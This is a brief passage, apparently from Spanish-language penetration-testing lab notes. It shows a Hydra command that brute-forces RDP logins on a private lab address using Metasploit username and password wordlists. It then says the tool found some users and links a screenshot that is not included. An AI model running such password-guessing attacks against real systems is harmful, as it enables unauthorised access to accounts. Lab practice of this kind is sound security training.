```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.0.0.31 -s 3333
```
Y nos encuentra los siguientes usuarios:
![[Pasted image 20240613010400.png]]

